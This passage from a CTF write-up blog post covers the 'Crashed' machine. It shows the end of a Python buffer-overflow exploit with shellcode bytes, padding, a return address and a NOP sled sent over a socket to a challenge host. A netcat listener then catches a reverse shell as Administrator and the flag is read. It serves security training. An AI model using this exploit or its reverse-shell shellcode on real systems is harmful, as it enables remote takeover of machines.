<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xb8\x42\x49\xf8\x19\xd9\xed\xd9\x74\x24\xf4\x5d\x29</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xc9\xb1\x52\x83\xed\xfc\x31\x45\x0e\x03\x07\x47\x1a</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xec\x7b\xbf\x58\x0f\x83\x40\x3d\x99\x66\x71\x7d\xfd</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xe3\x22\x4d\x75\xa1\xce\x26\xdb\x51\x44\x4a\xf4\x56</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xed\xe1\x22\x59\xee\x5a\x16\xf8\x6c\xa1\x4b\xda\x4d</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x6a\x9e\x1b\x89\x97\x53\x49\x42\xd3\xc6\x7d\xe7\xa9</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xda\xf6\xbb\x3c\x5b\xeb\x0c\x3e\x4a\xba\x07\x19\x4c</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x3d\xcb\x11\xc5\x25\x08\x1f\x9f\xde\xfa\xeb\x1e\x36</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x33\x13\x8c\x77\xfb\xe6\xcc\xb0\x3c\x19\xbb\xc8\x3e</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xa4\xbc\x0f\x3c\x72\x48\x8b\xe6\xf1\xea\x77\x16\xd5</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x6d\xfc\x14\x92\xfa\x5a\x39\x25\x2e\xd1\x45\xae\xd1</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x35\xcc\xf4\xf5\x91\x94\xaf\x94\x80\x70\x01\xa8\xd2</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xda\xfe\x0c\x99\xf7\xeb\x3c\xc0\x9f\xd8\x0c\xfa\x5f</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x77\x06\x89\x6d\xd8\xbc\x05\xde\x91\x1a\xd2\x21\x88</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xdb\x4c\xdc\x33\x1c\x45\x1b\x67\x4c\xfd\x8a\x08\x07</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xfd\x33\xdd\x88\xad\x9b\x8e\x68\x1d\x5c\x7f\x01\x77</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x53\xa0\x31\x78\xb9\xc9\xd8\x83\x2a\xf5\x92\x2c\xae</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x91\xa8\x32\x82\x5c\x24\xd4\xb6\x8e\x60\x4f\x2f\x36</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x29\x1b\xce\xb7\xe7\x66\xd0\x3c\x04\x97\x9f\xb4\x61</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x8b\x48\x35\x3c\xf1\xdf\x4a\xea\x9d\xbc\xd9\x71\x5d</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xca\xc1\x2d\x0a\x9b\x34\x24\xde\x31\x6e\x9e\xfc\xcb</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\xf6\xd9\x44\x10\xcb\xe4\x45\xd5\x77\xc3\x55\x23\x77</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x4f\x01\xfb\x2e\x19\xff\xbd\x98\xeb\xa9\x17\x76\xa2</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x3d\xe1\xb4\x75\x3b\xee\x90\x03\xa3\x5f\x4d\x52\xdc</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x50\x19\x52\xa5\x8c\xb9\x9d\x7c\x15\xd9\x7f\x54\x60</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x72\x26\x3d\xc9\x1f\xd9\xe8\x0e\x26\x5a\x18\xef\xdd</span><span class="sh">"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x42\x69\xea\x9a\xc4\x82\x86\xb3\xa0\xa4\x35\xb3\xe0</span><span class="sh">"</span>

<span class="nb">buffer</span> <span class="o">=</span> <span class="sh">"</span><span class="s">A</span><span class="sh">"</span> <span class="o">*</span> <span class="mi">998</span> <span class="o">+</span> <span class="sh">"</span><span class="se">\xA0\x12\x50\x62</span><span class="sh">"</span> <span class="o">+</span> <span class="sh">"</span><span class="se">\x90</span><span class="sh">"</span> <span class="o">*</span> <span class="mi">40</span> <span class="o">+</span> <span class="n">buf</span>

<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="nf">settimeout</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="sh">"</span><span class="s">18.193.129.237</span><span class="sh">"</span><span class="p">,</span> <span class="mi">1887</span><span class="p">))</span>
<span class="n">s</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="nf">send</span><span class="p">((</span><span class="sh">"</span><span class="s">SECRET</span><span class="sh">"</span><span class="o">+</span> <span class="nb">buffer</span> <span class="o">+</span> <span class="sh">'</span><span class="se">\r\n</span><span class="sh">'</span><span class="p">))</span>
<span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
</pre></table></code></div></div><p>‌ and We got a reverse shell!</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>root@kali:~/CyberTalents/Crashed# python exploit-remote.py
root@kali:~# nc <span class="nt">-nvlp</span> 9001
listening on <span class="o">[</span>any] 9001 ...
connect to <span class="o">[</span>127.0.0.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>127.0.0.1] 43124
Microsoft Windows <span class="o">[</span>Version 10.0.17763.1397]
<span class="o">(</span>c<span class="o">)</span> 2018 Microsoft Corporation. All rights reserved.
c:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt;whoami
<span class="nb">whoami
</span>ec2amaz-hf7234c<span class="se">\a</span>dministrator
</pre></table></code></div></div><h3 id="flag"><strong>Flag</strong></h3><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre>
<span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">system32</span><span class="o">&gt;</span><span class="n">cd</span> <span class="n">c</span><span class="o">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">Administrator</span><span class="err">\</span><span class="n">Desktop</span> 
<span class="n">cd</span> <span class="n">c</span><span class="o">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">Administrator</span><span class="err">\</span><span class="n">Desktop</span>

<span class="n">c</span><span class="o">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">Administrator</span><span class="err">\</span><span class="n">Desktop</span><span class="o">&gt;</span><span class="n">dir</span>
<span class="n">dir</span>
 <span class="n">Volume</span> <span class="n">in</span> <span class="n">drive</span> <span class="n">C</span> <span class="n">has</span> <span class="n">no</span> <span class="n">label</span><span class="p">.</span>
 <span class="n">Volume</span> <span class="n">Serial</span> <span class="n">Number</span> <span class="n">is</span> <span class="mi">3467</span><span class="o">-</span><span class="mi">4</span><span class="n">F3A</span>

 <span class="n">Directory</span> <span class="n">of</span> <span class="n">c</span><span class="o">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">Administrator</span><span class="err">\</span><span class="n">Desktop</span>

<span class="mi">09</span><span class="o">/</span><span class="mi">14</span><span class="o">/</span><span class="mi">2020</span>  <span class="mi">10</span><span class="o">:</span><span class="mi">50</span> <span class="n">PM</span>    <span class="o">&lt;</span><span class="kt">DIR</span><span class="o">&gt;</span>          <span class="p">.</span>
<span class="mi">09</span><span class="o">/</span><span class="mi">14</span><span class="o">/</span><span class="mi">2020</span>  <span class="mi">10</span><span class="o">:</span><span class="mi">50</span> <span class="n">PM</span>    <span class="o">&lt;</span><span class="kt">DIR</span><span class="o">&gt;</span>          <span class="p">..</span>
<span class="mo">06</span><span class="o">/</span><span class="mi">21</span><span class="o">/</span><span class="mi">2016</span>  <span class="mo">03</span><span class="o">:</span><span class="mi">36</span> <span class="n">PM</span>               <span class="mi">527</span> <span class="n">EC2</span> <span class="n">Feedback</span><span class="p">.</span><span class="n">website</span>
<span class="mo">06</span><span class="o">/</span><span class="mi">21</span><span class="o">/</span><span class="mi">2016</span>  <span class="mo">03</span><span class="o">:</span><span class="mi">36</span> <span class="n">PM</span>               <span class="mi">554</span> <span class="n">EC2</span> <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">Guide</span><span class="p">.</span><span class="n">website</span>
<span class="mi">09</span><span class="o">/</span><span class="mi">10</span><span class="o">/</span><span class="mi">2020</span>  <span class="mi">12</span><span class="o">:</span><span class="mi">35</span> <span class="n">AM</span>                <span class="mi">32</span> <span class="n">flag</span><span class="p">.</span><span class="n">txt</span>
<span class="mi">09</span><span class="o">/</span><span class="mi">10</span><span class="o">/</span><span class="mi">2020</span>  <span class="mo">04</span><span class="o">:</span><span class="mi">38</span> <span class="n">PM</span>    <span class="o">&lt;</span><span class="kt">DIR</span><span class="o">&gt;</span>          <span class="n">snapshot_2020</span><span class="o">-</span><span class="mi">08</span><span class="o">-</span><span class="mi">16</span><span class="n">_04</span><span class="o">-</span><span class="mi">47</span>
<span class="mi">09</span><span class="o">/</span><span class="mi">10</span><span class="o">/</span><span class="mi">2020</span>  <span class="mo">04</span><span class="o">:</span><span class="mi">38</span> <span class="n">PM</span>        <span class="mi">32</span><span class="p">,</span><span class="mi">121</span><span class="p">,</span><span class="mi">736</span> <span class="n">snapshot_2020</span><span class="o">-</span><span class="mi">08</span><span class="o">-</span><span class="mi">16</span><span class="n">_04</span><span class="o">-</span><span class="mi">47</span><span class="p">.</span><span class="n">zip</span>
<span class="mi">09</span><span class="o">/</span><span class="mi">14</span><span class="o">/</span><span class="mi">2020</span>  <span class="mi">08</span><span class="o">:</span><span class="mi">38</span> <span class="n">AM</span>    <span class="o">&lt;</span><span class="kt">DIR</span><span class="o">&gt;</span>          <span class="n">vulnserver</span><span class="o">-</span><span class="n">master</span>
               <span class="mi">4</span> <span class="n">File</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>     <span class="mi">32</span><span class="p">,</span><span class="mi">122</span><span class="p">,</span><span class="mi">849</span> <span class="n">bytes</span>
               <span class="mi">4</span> <span class="n">Dir</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>  <span class="mi">16</span><span class="p">,</span><span class="mi">779</span><span class="p">,</span><span class="mi">464</span><span class="p">,</span><span class="mi">704</span> <span class="n">bytes</span> <span class="n">free</span>

<span class="n">c</span><span class="o">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">Administrator</span><span class="err">\</span><span class="n">Desktop</span><span class="o">&gt;</span><span class="n">type</span> <span class="n">flag</span><span class="p">.</span><span class="n">txt</span>
<span class="n">type</span> <span class="n">flag</span><span class="p">.</span><span class="n">txt</span>
<span class="n">ffa3857489xxxxxxxxx474c9d</span>
</pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/cybertalents-writeups/'>Cybertalents Writeups</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/cybertalents/" class="post-tag no-text-decoration" >cybertalents</a> <a href="/tags/machines/" class="post-tag no-text-decoration" >machines</a> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a> <a href="/tags/bufferoverflow/" class="post-tag no-text-decoration" >bufferoverflow</a> <a href="/tags/exploitation/" class="post-tag no-text-decoration" >exploitation</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Cybertalents Crashed Machine Writeup - Muhammad Adel&url=https://itsfading.github.io/posts/Cybertalents-Crashed-Machine-Writeup/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Cybertalents Crashed Machine Writeup - Muhammad Adel&u=https://itsfading.github.io/posts/Cybertalents-Crashed-Machine-Writeup/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Cybertalents Crashed Machine Writeup - Muhammad Adel&url=https://itsfading.github.io/posts/Cybertalents-Crashed-Machine-Writeup/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/CRTP-Commands-CheatSheet/">CRTP Commands CheatSheet</a><li><a href="/posts/Active-Directory-Authentication/">Active Directory Authentication</a><li><a href="/posts/Mobile-Hacking-Lab-IOS-Challenges-Writeups/">MobileHackingLab IOS Challenges Writeups</a><li><a href="/posts/Active-Directory-Basics/">Active Directory Basics</a><li><a href="/posts/Cybertalents-Shadower-Machine-Writeup/">Cybertalents Shadower Machine Writeup</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/cybertalents/">cybertalents</a> <a class="post-tag" href="/tags/writeups/">writeups</a> <a class="post-tag" href="/tags/active-directory/">active directory</a> <a class="post-tag" href="/tags/redteaming/">redteaming</a> <a class="post-tag" href="/tags/android-security/">android security</a> <a class="post-tag" href="/tags/bug-hunting/">bug hunting</a> <a class="post-tag" href="/tags/machines/">machines</a> <a class="post-tag" href="/tags/android-security/">Android Security</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Cybertalents-Shadower-Machine-Writeup/"><div class="card-body"> <span class="timeago small" > Jun 26, 2021 <i class="unloaded">2021-06-26T18:45:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Cybertalents Shadower Machine Writeup</h3><div class="text-muted small"><p> Description Get The highest privilege on the machine and find the flag! Target IP: 35.156.4.248 Challenge Link: https://cybertalents.com/challenges/machines/shadower User Nmap PORT STATE SE...</p></div></div></a></div><div class="card"> <a href="/posts/Cybertalents-xCorp-Web-Writeup/"><div class="card-body"> <span class="timeago small" > Jun 26, 2021 <i class="unloaded">2021-06-26T17:45:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Cybertalents xCorp Web Challenge Writeup</h3><div class="text-muted small"><p> Description X corp made a new filtration for input data, prove it is secure enough. ‌Difficulty: Easy Challenge Link: https://cybertalents.com/challenges/web/x-corp Solution It an easy challen...</p></div></div></a></div><div class="card"> <a href="/posts/Cybertalents-SkiddyKill3r-Web-Writeup/"><div class="card-body"> <span class="timeago small" > Jun 26, 2021 <i class="unloaded">2021-06-26T18:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Cybertalents SkiddyKill3r Web Challenge Writeup</h3><div class="text-muted small"><p> Description Creative Thinking will make getting the flag so much easier Difficulty: Easy Challenge Link: https://cybertalents.com/challenges/web/skiddykill3r Solution Exploring The homepage c...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Cybertalents-Shadower-Machine-Writeup/" class="btn btn-outline-primary" prompt="Older"><p>Cybertalents Shadower Machine Writeup</p></a> <a href="/posts/Hackerone-GraphQL-CTF-Writeup/" class="btn btn-outline-primary" prompt="Newer"><p>Hackerone BugDB challenge Writeup</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://twitter.com/ItsFadinG_">Muhammad Adel</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by Passion and Enthusiasm</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/cybertalents/">cybertalents</a> <a class="post-tag" href="/tags/writeups/">writeups</a> <a class="post-tag" href="/tags/active-directory/">active directory</a> <a class="post-tag" href="/tags/redteaming/">redteaming</a> <a class="post-tag" href="/tags/android-security/">android security</a> <a class="post-tag" href="/tags/bug-hunting/">bug hunting</a> <a class="post-tag" href="/tags/machines/">machines</a> <a class="post-tag" href="/tags/android-security/">Android Security</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://itsfading.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
